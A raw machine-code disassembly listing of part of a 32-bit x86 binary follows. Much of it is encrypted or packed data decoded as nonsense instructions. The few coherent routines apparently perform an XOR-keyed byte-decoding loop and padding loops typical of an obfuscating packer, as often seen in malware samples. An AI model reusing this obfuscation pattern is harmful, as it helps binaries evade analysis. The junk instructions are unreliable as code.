  407ace:	cmp    eax,0xd406a226
  407ad3:	ja     0x407b37
  407ad5:	aad    0xbf
  407ad7:	aam    0xef
  407ad9:	sbb    al,0x2b
  407adb:	xor    ecx,ebp
  407add:	push   ebx
  407ade:	cmp    DWORD PTR [ebx-0x55],edi
  407ae1:	enter  0x5dce,0x58
  407ae5:	imul   ecx,DWORD PTR [edx-0x5a2bde75],0x13
  407aec:	mov    ds:0xb1524e5b,eax
  407af1:	push   ebx
  407af2:	xlat   BYTE PTR ds:[ebx]
  407af3:	xor    ah,BYTE PTR [ebx]
  407af5:	es push ebp
  407af7:	sbb    eax,esi
  407af9:	fsub   st,st(0)
  407afb:	mov    dl,0xd5
  407afd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407afe:	adc    al,0x19
  407b00:	jbe    0x407b65
  407b02:	aas    
  407b03:	push   es
  407b04:	in     eax,dx
  407b05:	xlat   BYTE PTR ds:[ebx]
  407b06:	ins    BYTE PTR es:[edi],dx
  407b07:	jne    0x407b41
  407b09:	or     DWORD PTR [edx],0x36
  407b0c:	mov    ecx,0x86b822b2
  407b11:	fldcw  WORD PTR [eax+0x5f]
  407b14:	test   DWORD PTR [esi+0x76],ebx
  407b17:	push   ss
  407b18:	cdq    
  407b19:	cmp    dl,dl
  407b1b:	cmp    dh,BYTE PTR [edi]
  407b1d:	cmp    edi,esp
  407b1f:	push   es
  407b20:	jp     0x407ab1
  407b22:	les    edi,FWORD PTR [ecx+0x43d56ace]
  407b28:	mov    esi,DWORD PTR [edx+0x26]
  407b2b:	imul   ecx,DWORD PTR [eax+0xe9fe09a],0xed6d2742
  407b35:	das    
  407b36:	(bad)  
  407b37:	mov    esi,0xe1b5b591
  407b3c:	inc    ebx
  407b3d:	lahf   
  407b3e:	inc    esi
  407b3f:	inc    esp
  407b40:	jns    0x407b26
  407b42:	imul   dl
  407b44:	sub    BYTE PTR [edx-0x58],dh
  407b47:	fnstenv [eax]
  407b49:	retf   0x6c45
  407b4c:	addr16 dec edx
  407b4e:	fidivr DWORD PTR [ebx+0x5cb19d66]
  407b54:	push   ebx
  407b55:	(bad)  
  407b56:	xor    DWORD PTR [edx+0x16],ebp
  407b59:	lea    esi,[edx]
  407b5b:	push   ss
  407b5c:	sti    
  407b5d:	std    
  407b5e:	int    0x23
  407b60:	and    al,0xfc
  407b62:	pop    esi
  407b63:	daa    
  407b64:	jmp    0x407b27
  407b66:	xchg   esi,eax
  407b67:	imul   eax,DWORD PTR [esi-0x6d2993e4],0x45748c36
  407b71:	daa    
  407b72:	lea    edx,[edx+0x2e]
  407b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b76:	push   cs
  407b77:	mov    dl,0xd0
  407b79:	inc    ecx
  407b7a:	pop    ecx
  407b7b:	je     0x407be8
  407b7d:	(bad)  
  407b7e:	dec    edi
  407b7f:	loopne 0x407b2f
  407b81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b82:	fst    QWORD PTR [esi+ebx*4+0x67dba652]
  407b89:	jge    0x407b94
  407b8b:	xor    DWORD PTR [edi+eiz*4],eax
  407b8e:	mov    eax,ds:0xc1b78ed7
  407b93:	ja     0x407b28
  407b95:	pop    ecx
  407b96:	iret   
  407b97:	and    eax,0x4422efda
  407b9c:	jmp    0x38b5e65
  407ba1:	jge    0x407bb3
  407ba3:	xor    edx,ecx
  407ba5:	add    edx,esi
  407ba7:	cmp    edx,edi
  407ba9:	ja     0x407bff
  407baf:	push   ebx
  407bb0:	jmp    0x407bba
  407bb5:	mov    esi,0x32729f
  407bba:	mov    eax,DWORD PTR [ebp-0x8]
  407bbd:	mov    edi,DWORD PTR [ebp-0x4]
  407bc0:	xor    edi,ecx
  407bc2:	add    edi,esi
  407bc4:	mov    esi,DWORD PTR [ebp+0x8]
  407bc7:	imul   edi,edx
  407bca:	mov    ebx,DWORD PTR [ebp+0xc]
  407bcd:	xor    eax,ecx
  407bcf:	add    eax,edx
  407bd1:	mov    al,BYTE PTR [ebx+eax*1+0x32729f]
  407bd8:	mov    BYTE PTR [edi+esi*1],al
  407bdb:	mov    eax,DWORD PTR [ebp-0x4]
  407bde:	xor    eax,ecx
  407be0:	lea    edx,[edx+eax*1+0x32729f]
  407be7:	mov    eax,DWORD PTR [ebp-0x4]
  407bea:	xor    eax,ecx
  407bec:	mov    esi,0xffcd8d61
  407bf1:	sub    esi,eax
  407bf3:	add    esi,DWORD PTR [ebp+0x10]
  407bf6:	cmp    edx,esi
  407bf8:	jbe    0x407bb5
  407bfe:	pop    ebx
  407bff:	mov    eax,0xf89c853b
  407c04:	pop    edi
  407c05:	pop    esi
  407c06:	leave  
  407c07:	ret    0xc
  407c0a:	push   ebp
  407c0b:	mov    ebp,esp
  407c0d:	mov    eax,ds:0x40d654
  407c12:	mov    DWORD PTR ds:0x417e3d,0x19
  407c1c:	cmp    DWORD PTR ds:0x417e3d,0x0
  407c23:	je     0x407c51
  407c29:	cmp    DWORD PTR ds:0x417e3d,0x1c
  407c30:	jne    0x407c3f
  407c36:	push   DWORD PTR [ebp-0x14]
  407c39:	call   DWORD PTR ds:0x40d368
  407c3f:	mov    ecx,DWORD PTR ds:0x417e3d
  407c45:	dec    ecx
  407c46:	mov    DWORD PTR ds:0x417e3d,ecx
  407c4c:	jmp    0x407c1c
  407c51:	mov    edx,0x32729f
  407c56:	sub    eax,edx
  407c58:	mov    ecx,0x7510859
  407c5d:	and    DWORD PTR ds:0x41237c,0x41abd2
  407c67:	push   esi
  407c68:	and    DWORD PTR ds:0x41abd2,0x0
  407c72:	push   DWORD PTR ds:0x41abd2
  407c78:	pop    esi
  407c79:	inc    esi
  407c7a:	mov    DWORD PTR ds:0x41abd2,esi
  407c80:	cmp    DWORD PTR ds:0x41abd2,0x28
  407c87:	jne    0x407ca2
  407c8d:	push   0x7e5a
  407c92:	push   0x41abde
  407c97:	push   0x1ce6
  407c9c:	call   DWORD PTR ds:0x40d1e0
  407ca2:	cmp    DWORD PTR ds:0x41abd2,0x1f
  407ca9:	jb     0x407c72
  407caf:	xor    DWORD PTR ds:0x412354,ebx
  407cb5:	mov    esi,DWORD PTR [ebp+0xc]
  407cb8:	xor    eax,ecx
  407cba:	jmp    0x407e39
  407cbf:	xchg   ebp,eax
  407cc0:	bound  ecx,QWORD PTR [ecx-0x6a06a6f5]
  407cc6:	pusha  
  407cc7:	jmp    0xe91f:0xaefdba79
  407cce:	mov    esp,0x7e7e13e9
  407cd3:	fdivr  QWORD PTR [edi+0x7e]
  407cd6:	jle    0x407c67
  407cd8:	jp     0x407cbd
  407cda:	mov    al,BYTE PTR [ebp+ecx*2-0x17]
  407cde:	loop   0x407c9e
  407ce0:	fs mov dh,0x4a
  407ce3:	cli    
  407ce4:	fs xor eax,0xfa852239
  407cea:	and    DWORD PTR [ebp-0x6d1c2eb9],edx
  407cf0:	scas   al,BYTE PTR es:[edi]
  407cf1:	out    dx,eax
  407cf2:	in     al,dx
  407cf3:	hlt    
  407cf4:	xchg   esp,eax
  407cf5:	popa   
  407cf6:	dec    edx
  407cf7:	adc    BYTE PTR [edi],0x8b
  407cfa:	adc    DWORD PTR ds:[edx-0x59],esi
  407cfe:	jle    0x407d5a
  407d00:	lods   al,BYTE PTR ds:[esi]
  407d01:	aaa    
  407d02:	ins    BYTE PTR es:[edi],dx
  407d03:	push   ebx
  407d04:	fs xchg esp,eax
  407d06:	les    ebx,FWORD PTR [edx+0x0]
  407d09:	adc    DWORD PTR [ecx],eax
  407d0b:	lea    edi,[edx+esi*8+0x58]
  407d0f:	ins    BYTE PTR es:[edi],dx
  407d10:	pop    ecx
  407d11:	jbe    0x407d1d
  407d13:	lea    ecx,[ecx-0x4f]
  407d16:	add    bh,BYTE PTR [esi-0x35ad668c]
  407d1c:	xor    BYTE PTR ds:0xf7870081,al
  407d22:	mov    DWORD PTR [eax-0x2b],edx
  407d25:	dec    edi
  407d26:	ss sub eax,0x8326a2a3
  407d2c:	sbb    bh,bh
  407d2e:	addr16 pop ds
  407d30:	or     al,0xa9
  407d32:	cdq    
  407d33:	sbb    ecx,0xffffffec
  407d36:	fcomp  DWORD PTR [ebp-0x7d8fea8c]
  407d3c:	dec    eax
  407d3d:	nop
  407d3e:	sbb    cl,BYTE PTR [eax]
  407d40:	mov    ebx,0x37bd183d
  407d45:	sbb    dh,BYTE PTR [esi-0x9255fee]
  407d4b:	dec    edi
  407d4c:	stos   BYTE PTR es:[edi],al
  407d4d:	mov    ebp,0x9043e296
  407d52:	fistp  QWORD PTR [edx+0x656e913e]
  407d58:	aam    0x50
  407d5a:	test   edi,edi
  407d5c:	test   BYTE PTR [edi+0x11d814ff],ah
  407d62:	sbb    ah,al
  407d64:	pop    edx
  407d65:	iret   
  407d66:	iret   
  407d67:	jle    0x407d77
  407d69:	mov    ah,0x13
  407d6b:	jne    0x407cf9
  407d6d:	out    0xd0,eax
  407d6f:	inc    edi
  407d70:	(bad)  
  407d71:	xor    al,0x97
  407d73:	jnp    0x407de0
  407d75:	pop    ss
  407d76:	cmp    dh,BYTE PTR [esi+0x4f]
  407d79:	push   0x15
  407d7b:	pop    es
  407d7c:	dec    ebp
  407d7d:	retf   0xed60
  407d80:	or     eax,0xb250b02e
  407d85:	xchg   edi,eax
  407d86:	cs mov edi,0xba1b2f6a
  407d8c:	(bad)  
  407d8d:	push   ds
  407d8e:	add    bl,BYTE PTR [ebp+eax*1-0x2f]
  407d92:	std    
  407d93:	call   DWORD PTR [esi]
  407d95:	xchg   DWORD PTR [esi],esi
  407d97:	int    0xb
  407d99:	jecxz  0x407d29
  407d9b:	int    0xf3
  407d9d:	fs imul esi,edi,0xffffffb4
  407da1:	sub    al,0xaf
  407da3:	inc    esp
  407da4:	(bad)  
  407da5:	rcr    cl,1
  407da7:	and    BYTE PTR [ebx],0xd5
  407daa:	or     al,0x95
  407dac:	push   0xb49f435d
  407db1:	gs pop ds
  407db3:	mov    eax,ds:0x674367b1
  407db8:	jle    0x407d81
  407dba:	sub    BYTE PTR [ecx-0x69],0x5d
  407dbe:	ins    DWORD PTR es:[edi],dx
  407dbf:	dec    esp
  407dc0:	out    0x62,al
  407dc2:	popa   
  407dc3:	ins    DWORD PTR es:[edi],dx
  407dc4:	and    DWORD PTR [edi-0x3e2409cd],ebx
  407dca:	out    dx,al
  407dcb:	idiv   BYTE PTR [esi-0x2e]
  407dce:	xchg   ebp,eax
  407dcf:	fild   WORD PTR [ecx+0x3c]
  407dd2:	cmp    dl,BYTE PTR [esi]
  407dd4:	pop    ebp
  407dd5:	inc    edi
  407dd6:	je     0x407e31
  407dd8:	jg     0x407d64
  407dda:	cdq    
  407ddb:	imul   DWORD PTR [ebp+0x13be1b97]
  407de1:	data16 or al,0xf3
  407de4:	inc    ebp
  407de5:	test   al,0xab
  407de7:	dec    edi
  407de8:	xor    esi,DWORD PTR [ebx+0x4ac282f8]
  407dee:	xchg   DWORD PTR [ebx-0x3c],ecx
  407df1:	stos   BYTE PTR es:[edi],al
  407df2:	jne    0x407de3
  407df4:	adc    al,0xf4
  407df6:	push   ss
  407df7:	and    dh,cl
  407df9:	jmp    0x85916122
  407dfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407dff:	mov    ds:0x693df893,eax
  407e04:	(bad)  
  407e05:	cmc    
  407e06:	int    0x24
  407e08:	xchg   ebp,eax
  407e09:	push   cs
  407e0a:	test   al,0xd1
  407e0c:	mov    esi,0xb8fe672c
  407e11:	call   0x8d2803a1
  407e16:	and    edx,DWORD PTR [ebp+0x1324e921]
  407e1c:	pop    esi
  407e1d:	stos   DWORD PTR es:[edi],eax
  407e1e:	xchg   esp,eax
  407e1f:	mov    al,0x7d
  407e21:	sti    
  407e22:	pop    esp
  407e23:	fcomp  st(7)
  407e25:	pop    esi
  407e26:	xor    ebp,DWORD PTR [edx-0x2664a39]
  407e2c:	ret    
  407e2d:	add    al,0xce
  407e2f:	pop    esp
  407e30:	xor    al,0xb3
  407e32:	lock adc DWORD PTR es:[ebx+esi*2-0x39c4386d],esp
  407e3b:	mov    DWORD PTR ds:0x41abe2,0x45d5
  407e45:	je     0x40818a
  407e4b:	mov    eax,ds:0x40d64c
  407e50:	mov    esi,DWORD PTR [ebp+0xc]
  407e53:	sub    eax,edx
  407e55:	xor    eax,ecx
  407e57:	cmp    eax,esi
  407e59:	jne    0x407e6f
  407e5f:	mov    eax,ds:0x40d654
  407e64:	add    eax,DWORD PTR ds:0x40d64c
  407e6a:	jmp    0x407ff5
  407e6f:	mov    eax,DWORD PTR [ebp+0xc]
  407e72:	jmp    0x407ff1
  407e77:	icebp  
  407e78:	mov    ebp,0x65db1f07
  407e7d:	mov    ecx,0x1c6c5851
  407e82:	cmp    DWORD PTR [edx],esp
  407e84:	jns    0x407e6a
  407e86:	xor    DWORD PTR [edi+0x10],ecx
  407e89:	jle    0x407f09
  407e8b:	fdivr  QWORD PTR [edi+0x7e]
  407e8e:	jle    0x407eff
  407e90:	(bad)  [edx-0x62]
  407e93:	mov    ebx,0xca4a830d
  407e98:	lods   eax,DWORD PTR ds:[esi]
  407e99:	jl     0x407f0e
  407e9b:	ss mov ebx,0xcc3c19a
  407ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ea2:	inc    ebx
  407ea3:	dec    ebx
  407ea4:	nop
  407ea5:	sbb    DWORD PTR [esi],ecx
  407ea7:	xchg   DWORD PTR [ebp+0x28413086],esp
  407ead:	mov    cl,0xc3
  407eaf:	sbb    ch,cl
  407eb1:	cdq    
  407eb2:	mov    al,ds:0x9be6a9a5
  407eb7:	scas   eax,DWORD PTR es:[edi]
  407eb8:	push   ebp
  407eb9:	idiv   ch
  407ebb:	dec    ebp
  407ebc:	xor    dl,BYTE PTR ds:[esi-0x502c2e36]
  407ec3:	test   BYTE PTR [edi],al
  407ec5:	dec    esi
  407ec6:	mov    al,BYTE PTR [esp+ebx*2]
  407ec9:	mov    esp,DWORD PTR [edi]
  407ecb:	dec    edx
  407ecc:	add    al,0x39
  407ece:	adc    BYTE PTR [ebx+0x72a7499b],bh
  407ed4:	fst    DWORD PTR [esi]
  407ed6:	popa   
  407ed7:	jo     0x407f05
  407ed9:	jae    0x407f3d
  407edb:	ror    DWORD PTR ds:0x9b339d45,cl
  407ee1:	or     ebx,DWORD PTR [eax+0x32]
  407ee4:	adc    esp,DWORD PTR [edx+0x434da95b]
  407eea:	ficom  DWORD PTR [edx+0x5b]
  407eed:	jo     0x407ebb
  407eef:	add    eax,0x13c6571
  407ef4:	mov    ch,0x92
  407ef6:	inc    eax
  407ef7:	sbb    ebx,esi
  407ef9:	stc    
  407efa:	in     eax,dx
  407efb:	jle    0x407f1e
  407efd:	mov    ch,0xe7
  407eff:	repnz lods eax,DWORD PTR ds:[esi]
  407f01:	dec    esi
  407f02:	(bad)  [esi]
  407f04:	mov    ds:0x946b05bd,eax
  407f09:	jmp    0x6d34:0x4520f828
  407f10:	cwde   
  407f11:	(bad)  
  407f12:	mov    ds:0x17d5858f,eax
  407f17:	fdivr  st,st(4)
  407f19:	pop    eax
  407f1a:	mov    cl,0x97
  407f1c:	mov    edx,eax
  407f1e:	jl     0x407f18
  407f20:	into   
  407f21:	push   esi
  407f22:	cmp    ah,BYTE PTR fs:[edx]
  407f25:	or     DWORD PTR [edx-0x2f5b1cb],0x24
  407f2c:	add    bh,dh
  407f2e:	cli    
  407f2f:	sub    DWORD PTR [ebx+esi*1],ecx
  407f32:	dec    edx
  407f33:	fbstp  TBYTE PTR [edi]
  407f35:	add    al,0xb7
  407f37:	out    dx,eax
  407f38:	jecxz  0x407fa9
  407f3a:	adc    eax,0x29634e21
  407f3f:	div    DWORD PTR [ecx]
  407f41:	sbb    ebx,DWORD PTR [ebx-0x6a5e4ed3]
  407f47:	xor    ecx,DWORD PTR [edx+0x5d]
  407f4a:	and    al,0x34
  407f4c:	popa   
  407f4d:	loopne 0x407f5f
  407f4f:	je     0x407f86
  407f51:	and    eax,ebp
  407f53:	pop    edx
  407f54:	jno    0x407f9e
  407f56:	popf   
  407f57:	jbe    0x407ef9
  407f59:	test   al,0x21
  407f5b:	ret    
  407f5c:	adc    DWORD PTR gs:[esi+0x3f],0x86ecac1d
  407f64:	xor    DWORD PTR [edx-0x1a],ebp
  407f67:	data16 sub BYTE PTR [ebx+ebp*1],0x9f
  407f6c:	into   
  407f6d:	popa   
  407f6e:	push   esi
  407f6f:	leave  
  407f70:	xchg   DWORD PTR [ebx-0x720d2ff5],esp
  407f76:	aam    0x96
  407f78:	hlt    
  407f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f7a:	mov    bl,0x37
  407f7c:	pop    edi
  407f7d:	inc    ecx
  407f7e:	jmp    0x407f74
  407f80:	xchg   ecx,eax
  407f81:	outs   dx,DWORD PTR ds:[esi]
  407f82:	outs   dx,BYTE PTR ds:[esi]
  407f83:	jo     0x407fb8
  407f85:	arpl   WORD PTR [eax+0x45],bp
  407f88:	sub    eax,DWORD PTR [edi]
  407f8a:	add    BYTE PTR [ecx-0x90e5ee4],ch
  407f90:	gs mov bl,0xb9
  407f93:	mov    DWORD PTR [eax-0x766ac6ae],edx
  407f99:	mov    cl,0xe3
  407f9b:	fs push esp
  407f9d:	add    eax,DWORD PTR [esp+ebp*4]
  407fa0:	or     ch,cl
  407fa2:	cmp    bl,BYTE PTR [ebp+0x1f]
  407fa5:	xchg   esi,eax
  407fa6:	pop    esp
  407fa7:	adc    eax,0x8db967ee
  407fac:	pop    es
  407fad:	or     eax,0x700f1d95
  407fb2:	mov    al,ds:0x9693f41b
  407fb7:	mov    ebx,0x706409e1
  407fbc:	addr16 xor ecx,eax
  407fbf:	adc    DWORD PTR [edi],ebx
  407fc1:	pop    ecx
  407fc2:	mov    gs,ebx
  407fc4:	fstp   TBYTE PTR [ecx+0x64]
  407fc7:	push   ebp
  407fc8:	stos   DWORD PTR es:[edi],eax
  407fc9:	mov    edi,DWORD PTR [eax+0x3]
  407fcc:	xchg   esp,eax
  407fcd:	inc    edi
  407fce:	shr    DWORD PTR [edx-0x8e2e66d],1
  407fd4:	pop    es
  407fd5:	lds    ebx,FWORD PTR [ebp-0xeafd13e]
  407fdb:	loop   0x407f8d
  407fdd:	das    
  407fde:	and    BYTE PTR [esi+0x61],0x9d
  407fe2:	pop    edi
  407fe3:	fwait
  407fe4:	pop    esi
  407fe5:	sbb    ecx,DWORD PTR [esi-0x36]
  407fe8:	loope  0x407ffa
  407fea:	cmp    edx,DWORD PTR [ebx]
  407fec:	jmp    0x407f84
  407fee:	retf   
  407fef:	adc    BYTE PTR [ebx-0x3dfc3ecd],dh
  407ff5:	mov    ds:0x40d64c,eax
  407ffa:	mov    eax,DWORD PTR [ebp+0xc]
  407ffd:	jmp    0x40817c
  408002:	and    ebp,DWORD PTR [edi]
  408004:	pop    ds
  408005:	xchg   edx,eax
  408006:	adc    esp,DWORD PTR [edx+0x57bdafa3]
  40800c:	arpl   WORD PTR [edi],si
  40800e:	push   eax
  40800f:	call   0x166e0858
  408014:	jle    0x408094
  408016:	fdivr  QWORD PTR [edi+0x7e]
  408019:	jle    0x408039
  40801b:	adc    ecx,ebx
  40801d:	dec    esi
  40801e:	out    0x74,eax
  408020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408021:	or     DWORD PTR [esi+0x17],eax
  408024:	xlat   BYTE PTR ds:[ebx]
  408025:	xchg   BYTE PTR [edi+eiz*8],bh
  408028:	and    BYTE PTR [eax-0x27c54c6],0x82
  40802f:	leave  
  408030:	push   ebp
  408031:	ret    0x8d07
  408034:	push   esi
  408035:	inc    ecx
  408036:	mov    ch,0x6b
  408038:	or     dh,0x78
  40803b:	je     0x40802a
  40803d:	(bad)  
  40803e:	js     0x407ffe
  408040:	retf   0x74f6
  408043:	out    dx,eax
  408044:	xor    BYTE PTR [ebx+0x7a],ah
  408047:	loope  0x4080c4
  408049:	les    edi,FWORD PTR [eax]
  40804b:	cmp    dh,BYTE PTR [eax+eax*1+0x35d05d94]
  408052:	mov    dh,0x57
  408054:	fisttp DWORD PTR [edx]
  408056:	sbb    eax,0xe001bf84
  40805b:	out    0x93,eax
  40805d:	(bad)  
  40805e:	ror    DWORD PTR [edx],1
  408060:	lods   al,BYTE PTR ds:[esi]
  408061:	(bad)  
  408062:	mov    ebp,edi
  408064:	adc    eax,0xf2d547f3
  408069:	jae    0x408045
  40806b:	aaa    
  40806c:	xor    BYTE PTR ds:0x9e9524cc,bl
  408072:	aas    
  408073:	into   
  408074:	outs   dx,BYTE PTR ds:[esi]
  408075:	xor    al,0x5a
  408077:	inc    edx
  408078:	adc    dh,dl
  40807a:	retf   0xdb26
  40807d:	mov    bl,0x5
  40807f:	inc    esp
  408080:	and    BYTE PTR ds:0xd2cd13da,0x15
  408087:	js     0x408075
  408089:	repz aaa 
  40808b:	xor    BYTE PTR ds:0xb23ac518,dh
  408091:	and    cl,al
  408093:	or     dl,BYTE PTR [edx+ecx*8+0x55]
  408097:	sbb    BYTE PTR [ecx-0x4c97c8c9],cl
  40809d:	cmp    DWORD PTR [edx],edx
  40809f:	les    ebp,FWORD PTR [ebx+0x3d]
  4080a2:	out    0x97,al
  4080a4:	imul   esi,DWORD PTR [esi],0xffffffe4
  4080a7:	jecxz  0x408120
  4080a9:	mov    al,BYTE PTR [esi-0x1e]
  4080ac:	arpl   WORD PTR [ebp-0x77a6bc2f],bx
  4080b2:	inc    eax
  4080b3:	and    ch,BYTE PTR [esi+edx*1+0x42]
  4080b7:	repz and bl,BYTE PTR [ecx+esi*4-0x4c]
  4080bc:	ret    0x3403
  4080bf:	or     al,0xc6
  4080c1:	dec    ecx
  4080c2:	dec    esp
  4080c3:	xor    eax,0x408c31c2
  4080c8:	(bad)  
  4080c9:	mov    ah,0xa6
  4080cb:	jo     0x4080db
  4080cd:	jg     0x408090
  4080cf:	rol    DWORD PTR [ecx-0x1f],0x6d
  4080d3:	cmp    al,0xab
  4080d5:	das    
  4080d6:	or     ecx,DWORD PTR [eax]
  4080d8:	bound  ecx,QWORD PTR [edi+ebx*8]
  4080db:	sub    DWORD PTR [esi-0x624a36fb],eax
  4080e1:	scas   al,BYTE PTR es:[edi]
  4080e2:	push   ebp
  4080e3:	jl     0x4080cd
  4080e5:	leave  
  4080e6:	xchg   edx,eax
  4080e7:	pop    eax
  4080e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e9:	add    BYTE PTR [ebp-0x33],ah
  4080ec:	jl     0x408101
  4080ee:	push   ebx
  4080ef:	fldcw  WORD PTR [ebx]
  4080f1:	(bad)  
  4080f2:	scas   eax,DWORD PTR es:[edi]
  4080f3:	jnp    0x40808f
  4080f5:	add    DWORD PTR [edx+0x1f9ae3ef],ecx
  4080fb:	push   edx
  4080fc:	repnz and WORD PTR [ebx-0x37],sp
  408101:	jbe    0x40812a
  408103:	call   0x9603d342
  408108:	inc    edx
  408109:	push   cs
  40810a:	or     DWORD PTR [edi-0x4b],edi
  40810d:	pop    esi
  40810e:	retf   0x965e
  408111:	cmc    
  408112:	mov    ch,0x5c
  408114:	mov    eax,0x1113ace0
  408119:	sub    al,0x8c
  40811b:	push   esi
  40811c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40811d:	scas   eax,DWORD PTR es:[edi]
  40811e:	dec    ebx
  40811f:	pop    edi
  408120:	sbb    DWORD PTR [edx-0xd],eax
  408123:	add    DWORD PTR [esp+esi*1-0x4976bfd1],0xffffffae
  40812b:	imul   ebp,DWORD PTR ds:0x165dca55,0xfffffffb
  408132:	mov    eax,ds:0x2f318ee3
  408137:	cmc    
  408138:	cmp    bh,bh
  40813a:	iret   
  40813b:	repz ja 0x4081ad
  40813e:	xchg   esi,eax
  40813f:	cmp    eax,0xee484f41
  408144:	mov    dl,0x54
  408146:	cdq    
  408147:	jmp    0x83ed7f9
  40814c:	xchg   DWORD PTR [edx-0x50804792],ecx
  408152:	aad    0x4
  408154:	cmp    edx,DWORD PTR [ebp-0x68]
  408157:	es and esp,esp
  40815a:	cs jns 0x4080e3
  40815d:	out    0xf4,al
  40815f:	or     al,0xeb
  408161:	cmp    al,0xb2
  408163:	ds sub eax,0x70688d7d
  408169:	(bad)  
  40816a:	bound  edx,QWORD PTR [ebx+0x45]
  40816d:	push   ebx
  40816e:	xchg   ebp,eax
  40816f:	sub    eax,0xf3a62c1d
  408174:	loopne 0x4081cc
  408176:	pop    edi
  408177:	sub    DWORD PTR [ecx-0x50],edx
  40817a:	add    eax,DWORD PTR [ebx+0x33]
  40817d:	rol    DWORD PTR [ebx],0xc2
  408180:	mov    ds:0x40d654,eax
  408185:	jmp    0x408313
  40818a:	mov    eax,ds:0x40d654
  40818f:	jmp    0x40830e
  408194:	push   edi
  408195:	(bad)  [ecx+0x797ba9ef]
  40819b:	gs mov ch,0x6e
  40819e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40819f:	es add al,0xa7
  4081a3:	add    eax,0x7e7e1783
  4081a8:	fdivr  QWORD PTR [edi+0x7e]
  4081ab:	jle    0x4081e5
  4081ad:	xchg   ebp,eax
  4081ae:	xor    bl,BYTE PTR [esi+eax*4+0x17659a09]
  4081b5:	mov    BYTE PTR [edi],bh
  4081b7:	xor    DWORD PTR [esi+0x7e83170c],esp
  4081bd:	cdq    
  4081be:	loopne 0x408209
  4081c0:	jg     0x4081d4
  4081c2:	xlat   BYTE PTR ds:[ebx]
  4081c3:	add    edx,DWORD PTR [ecx]
  4081c5:	cdq    
  4081c6:	ins    DWORD PTR es:[edi],dx
  4081c7:	out    0x23,eax
  4081c9:	(bad)  
  4081ca:	and    eax,0xb4bfaa22
  4081cf:	addr16 (bad) 
  4081d1:	fnstsw WORD PTR [eax]
  4081d3:	cld    
  4081d4:	test   BYTE PTR [ebx+0x10],cl
  4081d7:	cs fs pop ebx
  4081da:	int3   
  4081db:	sbb    eax,0xa5dd7c57
  4081e0:	repz retf 
  4081e2:	in     eax,dx
  4081e3:	cld    
  4081e4:	cmp    al,0xaa
  4081e6:	jmp    0xad474ff8
  4081eb:	retf   0x4247
  4081ee:	jnp    0x4081ae
  4081f0:	scas   al,BYTE PTR es:[edi]
  4081f1:	mov    al,0x22
  4081f3:	fucomi st,st(5)
  4081f5:	shl    eax,cl
  4081f7:	or     BYTE PTR [ebp+0x1607d80a],bh
  4081fd:	(bad)  
  4081fe:	or     cl,0x58
  408201:	idiv   ebp
  408203:	(bad)  
  408204:	pop    eax
  408205:	fist   DWORD PTR [ecx+0x75]
  408208:	ds jle 0x4081ad
  40820b:	ror    al,1
  40820d:	push   ds
  40820e:	retf   0x3275
  408211:	xchg   ebp,eax
  408212:	jg     0x40826f
  408214:	xchg   ebp,eax
  408215:	pop    eax
  408216:	ins    BYTE PTR es:[edi],dx
  408217:	aas    
  408218:	scas   al,BYTE PTR es:[edi]
  408219:	jnp    0x40821d
  40821b:	xlat   BYTE PTR ds:[ebx]
  40821c:	retf   0xf098
  40821f:	call   0xa29d:0x9b4b7ce0
  408226:	call   0xa1a5:0x7512390c
  40822d:	call   0xc5c3:0x851768ec
  408234:	aas    
  408235:	push   ebp
  408236:	inc    eax
  408237:	popf   
  408238:	pop    ebx
  408239:	mov    ebp,0x9085aaff
  40823e:	mov    ebx,0xc24ef030
  408243:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408244:	and    eax,0xc5268632
  408249:	pop    edx
  40824a:	jle    0x4081cc
  40824c:	sbb    al,0x77
  40824e:	cwde   
  40824f:	cdq    
  408250:	mov    edi,gs
  408252:	push   ss
  408253:	and    al,0xa5
  408255:	lds    ebx,FWORD PTR [edx+0x55]
  408258:	sbb    eax,0x8483c751
  40825d:	or     edi,DWORD PTR [edx+0x6b]
  408260:	retf   0x1946
  408263:	daa    
  408264:	jge    0x40823b
  408266:	in     al,dx
  408267:	adc    DWORD PTR [edi+0x8],0x46c329c0
  40826e:	mov    dl,0xf6
  408270:	sub    al,0xa
  408272:	(bad)  
  408273:	jbe    0x4082e6
  408275:	sub    al,0x9b
  408277:	nop
  408278:	pop    ss
  408279:	adc    ebp,DWORD PTR [ebx]
  40827b:	pop    es
  40827c:	mov    bl,0x40
  40827e:	mov    ah,ch
  408280:	inc    BYTE PTR [ebx-0x2]
  408283:	repz fbstp TBYTE PTR [eax+eiz*2+0x17]
  408288:	mov    eax,0x19a9ff78
  40828d:	ds inc ecx
  40828f:	pusha  
  408290:	pop    esi
  408291:	test   eax,0x76bf5938
  408296:	inc    edi
  408297:	inc    ecx
  408298:	fsubr  QWORD PTR [edi+0x55ab0346]
  40829e:	or     BYTE PTR [ecx+eiz*8+0x23],0xe9
  4082a3:	cli    
  4082a4:	mov    edi,DWORD PTR [edi-0x265e34cb]
  4082aa:	push   ds
  4082ab:	sub    al,0x17
  4082ad:	scas   eax,DWORD PTR es:[edi]
  4082ae:	xchg   ebp,esp
  4082b0:	inc    edi
  4082b1:	push   esp
  4082b2:	push   edx
  4082b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082b4:	inc    eax
  4082b5:	mov    eax,ds:0x394de76e
  4082ba:	and    ecx,ebp
  4082bc:	fs ss int 0xf
  4082c0:	(bad)  
  4082c1:	int    0x4b
  4082c3:	out    0xa1,eax
  4082c5:	cmp    dh,BYTE PTR [edi+0x1ef34db2]
  4082cb:	and    al,0xfb
  4082cd:	mov    eax,esi
  4082cf:	xchg   DWORD PTR [esi-0xd],ecx
  4082d2:	jb     0x408327
  4082d4:	mov    edi,0x9a28c732
  4082d9:	pop    edx
  4082da:	pop    esp
  4082db:	dec    edi
  4082dc:	sbb    ah,BYTE PTR [ebx]
  4082de:	sti    
  4082df:	pop    edi
